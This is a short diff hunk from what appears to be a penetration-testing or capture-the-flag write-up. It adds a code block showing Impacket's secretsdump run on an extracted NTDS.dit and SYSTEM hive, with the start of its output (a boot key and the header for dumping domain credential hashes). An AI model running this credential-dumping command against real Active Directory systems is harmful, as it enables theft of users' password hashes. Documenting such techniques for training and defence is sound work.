@@ -103,6 +103,7 @@ By utilizing the Impacket tool `secretsdump`, we can extract the local hashes fo
 ```
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
+```
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL 
 [*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
